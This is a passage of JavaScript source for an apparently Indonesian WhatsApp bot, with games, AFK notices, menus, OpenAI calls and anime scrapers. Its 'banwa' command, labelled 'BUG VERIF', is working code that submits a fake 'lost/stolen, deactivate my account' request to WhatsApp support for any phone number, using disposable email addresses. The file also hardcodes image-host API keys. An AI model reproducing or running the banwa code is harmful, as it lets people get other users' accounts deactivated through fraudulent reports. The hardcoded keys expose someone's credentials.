const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
conn.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: conn.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await conn.sendButtonText(m.chat, [{ buttonId: prefix+'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, conn.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)
const color = (text, color) => {
    return !color ? chalk.green(text) : chalk.keyword(color)(text)
    }
    
    async function tinyurl(url){
        return new Promise (async (resolve, reject) => {
axios.get(`https://tinyurl.com/api-create.php?url=${url}`).then(async(res, err) =>{
    if (err) return reject(err)
    resolve(res.data)
})
})
}
    async function uptotele(path){
        let form = new FormData();
        form.append('photo', fs.createReadStream(path))
        let data = await axios({ method: "POST", url: "https://telegra.ph/upload",data: form, headers: { 'Content-Type': `multipart/form-data; boundary=${form._boundary}`}})
        return 'https://telegra.ph' + data.data[0].src
     }
    async function uptoibb(path){
        return new Promise (async (resolve, reject) => {
        imgbb('91904762b2cd230ce1d861279bd6bf1d', path).then((res) =>{ // api = 355efbb2293c1b5f9782371a61346afe
        resolve(res.url)
                }).catch(reject)
        })
     }
    async function uptoanon(path){
return new Promise((resolve, reject) => {
    if (!fs.existsSync(path)) return reject('Invalid path!')
    request('https://api.anonfiles.com/upload', { method: 'POST', formData: { file: fs.createReadStream(path) }}, function(err, body) {
        if (err) return reject(err)
        resolve(JSON.parse(body.body).data.file)
    })
})
}

          // Anti Spam
          if (!isCreator && isCmd && msgFilter.isFiltered(from) && !m.isGroup) {
            return console.log('[', color('SPAM!!', 'red'), ']', color(moment(mek.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname)),
            reply('Spam!! Wait Cooldown 5 second!')
            } else if (!isCreator && isCmd && msgFilter.isFiltered(from) && m.isGroup) {
            return console.log('[', color('SPAM!!', 'red'), ']', color(moment(mek.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName)),
            reply('Spam!! Wait Cooldown 5 second!')}
            // [BETA] Avoid Spam Message
		//if (isCmd && !isCreator && !msgFilter.isFiltered(from)) {
        //    if (command.length !== 1) {
         //    msgFilter.addFilter(from)
         //   }
         // }

 // console.log
 if (m.isGroup && isCmd) {
    console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(mek.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
  }
  
  if (!m.isGroup && isCmd) {
   console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(mek.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
    }
    
//swtich case
        switch(command) {
            case prefix+'tohidetag':   case prefix+'totag':{
                if (!m.isGroup) return
                if (!isCreator) return 
                let memx = await getMembers(from)
                if (isQuotedMsg && quotedMsg.conversation) {
                  for (let x of parseMention(quotedMsg.chats)) {
                    memx.push(x)
                  }
                  conn.sendMessage(from, {text: quotedMsg.chats, mentions: participants.map(a => a.id)})
                } else if (isQuotedMsg && quotedMsg) {
                  for(let i of parseMention(quotedMsg.chats)) {
                    memx.push(i)
                  }
                  conn.sendMessage(from, quotedMsg, { mentions: participants.map(a => a.id) })
                } else {
                  reply(`Reply media/teks yang ingin di jadikan hidetag!`)
                }
           }
                break
            case prefix+'fetch':{
                       if (!q) return
                       if (!isCreator) return
                       let ress = await fetch(q)
                       if (!/text|json/.test(ress.headers.get('content-type'))) return reply(ress)
                       var tks = await ress.buffer()
                       try {
                          tks = util.format(JSON.parse(tks+''))
                            } catch (e) {
                          tks = tks + ''
                            } finally {
                          reply(tks.slice(0, 65536) + '')
                       }
                      }
                       break
            case prefix+'ai':{
                if(!q) return reply('input text')
            const configuration = new Configuration({
                apiKey: pickRandom(global.keyopenai),
              });
              const openai = new OpenAIApi(configuration);
  
              const response = await openai.createCompletion({
                model: "text-davinci-003",
                prompt: text,
                temperature: 0.3,
                max_tokens: 2000,
                top_p: 1.0,
                frequency_penalty: 0.0,
                presence_penalty: 0.0,
              });
              m.reply(`${q}\n${response.data.choices[0].text}`);
            }
            break
            case prefix+'imgai':
                if(!q) return reply('input text')
                try {
                    const configuration = new Configuration({
                        apiKey: pickRandom(global.keyopenai),
                      });
                      const openai = new OpenAIApi(configuration);
                      const response = await openai.createImage({
                        prompt: text,
                        n: 1,
                        size: "512x512",
                      });
                      //console.log(response.data.data[0].url)
                      conn.sendImage(from, response.data.data[0].url, text, mek);
                    } catch (err) {
                      console.log(err);
                      m.reply("Maaf, sepertinya ada yang error :"+ err);
                    }
                    break
            // BUG VERIF //
case prefix+'banwa': {
    if (!args[1]) return
    if (!isCreator) return
  let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
  let cookie = ntah.headers["set-cookie"].join("; ")
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "ID")
  form.append("phone_number", q)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Perdido/roubado: desative minha conta")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axios({
    url,
    method: "POST",
    data: form,
    headers: {
      cookie
    }
  })
  reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
  }
  break
  case prefix:
      reply(`Did you mean ${prefix}help`)
      break
            case 'prefix':
                reply(prefix)
                break
                case 'bot':
                    reply('im here mastah >_<')
                    break
                    case 'test':
                        reply('im here mastah >_<')
                        break
            case prefix+'sendmsg': {
                if (!isCreator) return
                reply('please wait..')
                await sleep(1000)
                
                // Read Database
                var msg_bot = await fs.readFileSync('./message.js')
                
                // Sending Document
                conn.sendMessage(from, { document: msg_bot, mimetype: 'document/application', fileName: 'message.js'}, {quoted:m})
                }
                break
case prefix+'menu':    case prefix+'help': {
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
                const more = String.fromCharCode(8206)
                const readmore = more.repeat(4001)
                const mark_slebew = '0@s.whatsapp.net'
                var footer_nya =`𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 @${mark_slebew.split("@")[0]}`
                var menu_nya =`${listmenu(sender,prefix,pushname,tanggal,jam,runtime, readmore)}`
                let btn_menu = [
                ]
                var but_menu = {
                text: menu_nya,
                footer: footer_nya,
                mentions: [sender, mark_slebew],
                headerType: 1
                }
                conn.sendMessage(from, but_menu, {quoted:m}).catch((err) => m.reply(jsonformat(err)))
                //reply(menu_nya)
            }
break
	case prefix+'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`[AWAY FROM KEYBOARD]\n\n${m.pushName} *Already Afk*\nReason: ${text ? ': ' + text : ''}`)
            }
            break	
                case prefix+'ttc': case prefix+'ttt': case prefix+'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`You Are Still In The Game`)
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

`
            if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Waiting For Partner' + (text ? ` Type The Command Below ${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case prefix+'delttc': case prefix+'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            conn.sendText(m.chat, `Successfully deleted TicTacToe session`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 does not exist`)
            } else throw '?'
            } catch (e) {
            m.reply('damaged')
            }
            }
            break
            case prefix+'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[1] === 'mute') {
                    conn.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'unmute') {
                    conn.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'archive') {
                    conn.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'unarchive') {
                    conn.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'read') {
                    conn.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'unread') {
                    conn.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[1] === 'delete') {
                    conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case prefix+'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[1],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
            break  
            case prefix+'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[1]) && !args[1].includes('whatsapp.com')) throw 'Link Invalid!'
                let result = args[1].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case prefix+'leave': {
                if (!isCreator) throw mess.owner
                await conn.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case prefix+'setprefix':
                if (!isCreator) throw mess.owner
                if (args.length < 2) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
                if (q === 'multi'){
                    conn.multi = true
                    conn.nopref = false
                    reply(`Berhasil mengubah prefix ke ${q}`)
                } else if (q === 'nopref'){
                    conn.multi = false
                    conn.nopref = true
                    reply(`Berhasil mengubah prefix ke ${q}`)
                } else {
                    conn.multi = false
                    conn.nopref = false
                    conn.prefa = `${q}`
                    reply(`Berhasil mengubah prefix ke ${q}`)
                }
                break
            case prefix+'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif has been successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
            }
            break

            /*
	case prefix+'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
    */
            // MYNIMEKU
case prefix+'mynime':  case prefix+'mynimeku':{
    //if (!q) 
    let page = args[1] ? args[1] : '1'
    try {
    //let same = await axios.get(samehadaku + `/ongoing/page/${page}`)
    //let result = same.data.anime_list
    //console.log(result)
    await mynimeku.latestAnime(page).then(async(res) => {
    let result = res.result
    //console.log(result)
    if (result.length < 1) return reply('anime not found')
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}mynimeku-detail ${x.link}`,
  description: `${x.link}`
  })
  }
  const listMessage = {
    text: `*MYNIMEKU ANIME ONGOING*\n\npage: ${page}`,
    footer: botname,
    buttonText: "List Anime",
    sections: [{
  title: "MYNIMEKU ONGOING",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m}) 
})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break  
  case prefix+'mynimeku-s':  case prefix+'mynimeku-search':{
    if (!q) return reply(`Input query anime!`)
    //let same = await axios.get(samehadaku + `/search?query=${q}`)
    //let result = same.data.anime_list
    //console.log(result)
    await mynimeku.mynimeSearch(q).then(async(result) => {
    if (result.length < 1) return reply('anime not found')
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}mynimeku-detail ${x.link}`,
  description: `\n${x.link}`
  })
  }
  const listMessage = {
    text: `*MYNIMEKU SEARCH ANIME*\n\n${q}`,
    footer: botname,
    buttonText: "List Anime",
    sections: [{
  title: "MYNIMEKU SEARCH",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
})
  }
  break
  case prefix+'mynimeku-d':  case prefix+'mynimeku-detail':  {
    if (args.length < 2) return reply(`MYNIMEKU DETAIL ANIME\n\n~usage: ${command} <mynimeku url>`)
    if (!isUrl(args[1]) && !args[1].includes('mynimeku.com')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari mynimeku.com')
    if (!args[1].includes('series')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari mynimeku.com')
    try {
      //let same = await axios.get(samehadaku + `/detail?url=${args[1]}`)
     await mynimeku.detailAnime(q).then(async(result) => {
  let list = []
  for (let x of result.episode_list) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}mynimeku-dl ${x.link}`,
  description: `*Upload Date* : ${x.uploaded_on}`
  })
  }
  const listMessage = {
    text: `*MYNIMEKU ANIME DETAIL*\n\n*${result.title}*\nJapanese: ${result.title_japanese}\nRating: ${result.rating}\nStudio: ${result.studio}\n\n${result.synopsis}\n`,
    footer: botname,
    buttonText: "Episode List",
    sections: [{
  title: "pilih episode yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m}) 
})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
    case prefix+'mynimeku-dl':  case prefix+'mynimeku-download':{
    if (args.length < 2) return reply(`MYNIMEKU DOWNLOADER ANIME\n\n~usage: ${command} <mynimeku url eps>`)
    if (!isUrl(args[1]) && !args[1].includes('mynimeku')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari web mynimeku.com')
    try {
      //let otaku = await axios.get(otakudesu + `/episode?url=${args[1]}`)
     await mynimeku.downloadAnime2(args[1]).then(async(result) => {
    let nime = result.url
    let low = nime.Cloud_360p
    let medium = nime.Cloud_480p
    let high = nime.Cloud_720p
    if (nime = undefined) return reply('anime not found')
  let list = []
  list.push({
  title: `Mp4 360P`,
  rowId: `${prefix}sendnime ${low}`,
  description: `SERVER CLOUD`
  },
  {
    title: `Mp4 480P`,
    rowId: `${prefix}sendnime ${medium}`,
    description: `SERVER CLOUD`
    },
    {
      title: `Mp4 720P`,
      rowId: `${prefix}sendnime ${high}`,
      description: `SERVER CLOUD`
      })
  const listMessage = {
    text: `*MYNIMEKU DOWNLOAD EPISODE*\n\n*${result.title}*\n\n${args[1]}\n`,
    footer: botname,
    buttonText: "Pilih Resolusi",
    sections: [{
  title: "pilih resolusi yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m})
})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
            // SAMEHADAKU 
case prefix+'same':  case prefix+'samehadaku':{
    //if (!q) 
    let page = args[1] ? args[1] : '1'
    try {
    let same = await axios.get(samehadaku + `/ongoing/page/${page}`)
    let result = same.data.anime_list
    //console.log(result)
    if (result.length < 1) return reply('anime not found')
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}same-dl ${x.link}`,
  description: `${x.link}`
  })
  }
  const listMessage = {
    text: `*SAMEHADAKU ANIME ONGOING*\n\npage: ${page}`,
    footer: botname,
    buttonText: "List Anime",
    sections: [{
  title: "SAMEHADAKU ONGOING",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
  case prefix+'same-s':  case prefix+'samehadaku-s':  case prefix+'samehadaku-search':{
    if (!q) return reply(`Input query anime!`)
    let same = await axios.get(samehadaku + `/search?query=${q}`)
    let result = same.data.anime_list
    //console.log(result)
    if (result.length < 1) return reply('anime not found')
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}same-detail ${x.link}`,
  description: `\n${x.link}`
  })
  }
  const listMessage = {
    text: `*SAMEHADAKU SEARCH ANIME*\n\n${q}`,
    footer: botname,
    buttonText: "List Anime",
    sections: [{
  title: "SAMEHADAKU SEARCH",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
  }
  break
  case prefix+'same-detail':  case prefix+'samehadaku-detail':  {
    if (args.length < 2) return reply(`SAMEHADAKU DETAIL ANIME\n\n~usage: ${command} <samehadaku url>`)
    if (!isUrl(args[1]) && !args[1].includes('samehadaku')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari samehadaku.win')
    if (!args[1].includes('anime')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari samehadaku.win')
    try {
      let same = await axios.get(samehadaku + `/detail?url=${args[1]}`)
    let result = same.data
  let list = []
  for (let x of result.episode_list) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}same-dl ${x.link}`,
  description: `*Upload Date* : ${x.uploaded_on}`
  })
  }
  const listMessage = {
    text: `*SAMEHADAKU ANIME DETAIL*\n\n*${result.title}*\nJapanese: ${result.japanese}\nEnglish: ${result.english}\nScore: ${result.score}\nRate: ${result.rate}\nType: ${result.type}\nDuration: ${result.duration}\nSource: ${result.source}\nSynonym: ${result.synonym}\n${result.synopsis}\n`,
    footer: botname,
    buttonText: "Episode List",
    sections: [{
  title: "pilih episode yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
  case prefix+'same-dl':  case prefix+'samehadaku-dl':  case prefix+'samehadaku-download':{
    if (args.length < 2) return reply(`SAMEHADAKU DOWNLOADER\n\n~usage: ${command} <samehadaku url eps>`)
    if (!isUrl(args[1]) && !args[1].includes('samehadaku')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari samehadaku.win')
    try {
      let same = await axios.get(samehadaku + `/episode?url=${args[1]}`)
    let result = same.data
    let mkv = result.download_list[0]
    let mp4 = result.download_list[1]
    let x265 = result.download_list[2]
  let list = []
  list.push({
  title: `${mkv.title} - ${mkv.content[0].vendor[0].name}`,
  rowId: `${prefix}sendnime ${mkv.content[0].vendor[0].link}`,
  description: `${mkv.content[0].quality}`
  },{
    title: `${mkv.title} - ${mkv.content[0].vendor[0].name}`,
    rowId: `${prefix}sendnime ${mkv.content[1].vendor[0].link}`,
    description: `${mkv.content[1].quality}`
    },{
      title: `${mkv.title} - ${mkv.content[0].vendor[0].name}`,
      rowId: `${prefix}sendnime ${mkv.content[2].vendor[0].link}`,
      description: `${mkv.content[2].quality}`
      },{
        title: `${mp4.title} - ${mp4.content[1].vendor[0].name}`,
        rowId: `${prefix}sendnime ${mp4.content[0].vendor[0].link}`,
        description: `${mp4.content[0].quality}`
        },{
          title: `${mp4.title} - ${mp4.content[1].vendor[0].name}`,
          rowId: `${prefix}sendnime ${mp4.content[1].vendor[0].link}`,
          description: `${mp4.content[1].quality}`
          },{
            title: `${mp4.title} - ${mp4.content[1].vendor[0].name}`,
            rowId: `${prefix}sendnime ${mp4.content[2].vendor[0].link}`,
            description: `${mp4.content[2].quality}`
            },{
              title: `${x265.title} - ${x265.content[2].vendor[0].name}`,
              rowId: `${prefix}sendnime ${x265.content[0].vendor[0].link}`,
              description: `${x265.content[0].quality}`
              },{
                title: `${x265.title} - ${x265.content[2].vendor[0].name}`,
                rowId: `${prefix}sendnime ${x265.content[1].vendor[0].link}`,
                description: `${x265.content[1].quality}`
                },{
                  title: `${x265.title} - ${x265.content[2].vendor[0].name}`,
                  rowId: `${prefix}sendnime ${x265.content[2].vendor[0].link}`,
                  description: `${x265.content[2].quality}`
                  })
  const listMessage = {
    text: `*SAMEHADAKU DOWNLOAD EPISODE*\n\n*${result.title}*\nUpdate: ${result.release_date}\n\n${args[1]}\n`,
    footer: botname,
    buttonText: "Pilih Resolusi",
    sections: [{
  title: "pilih resolusi yang kamu inginkan",
    rows: list
  }],
  listType: 1
  }
  await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
  case prefix+'same-batch':  case prefix+'samehadaku-batch': {
    if (args.length < 2) return reply(`SAMEHADAKU DETAIL ANIME\n\n~usage: ${command} <samehadaku url>`)
    if (!isUrl(args[1]) && !args[1].includes('samehadaku')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari samehadaku.win')
    if (!args[1].includes('batch')) return reply('link yang kamu berikan tidak valid, pastikan link yg kamu berikan berasal dari samehadaku.win')
    try {
      let same = await axios.get(samehadaku + `/batch?url=${args[1]}`)
    let result = same.data
    await reply(toJSON(result.download_list))
  } catch (err) {
    reply(mess.error.api)
  }
  }
  break

  // OTAKUDESU
case prefix+'otaku':  case prefix+'otakudesu':{
    //if (!q) 
    let page = args[1] ? args[1] : '1'
    try {
    let otaku = await axios.get(otakudesu + `/ongoing/page/${page}`)
    let result = otaku.data.ongoing
    //console.log(result)
    if (result.length < 1) return reply('anime not found')
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.title}\n`,
  rowId: `${prefix}otaku-detail ${x.url}`,
  description: `${x.url}`
  })
  }
  const listMessage = {
    text: `*OTAKUDESU ANIME ONGOING*\n\npage: ${page}`,
    footer: botname,
    buttonText: "List Anime",
    sections: [{
  title: "OTAKUDESU ONGOING",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    reply(jsonformat(err))
  }
  }
  break
  case prefix+'otaku-s':  case prefix+'otakudesu-search':{
      //if (!q) 
      if (!q) return reply(`Input query anime!`)
    try {
      let otaku = await axios.get(otakudesu + `/search?query=${q}`)
      let result = otaku.data.search
      //console.log(result)
      if (result.length < 1) return reply('anime not found')
    let list = []
    for (let x of result) {
    list.push({
    title: `${x.title}\n`,
    rowId: `${prefix}otaku-detail ${x.url}`,
    description: `${x.url}`
    })
    }
    const listMessage = {
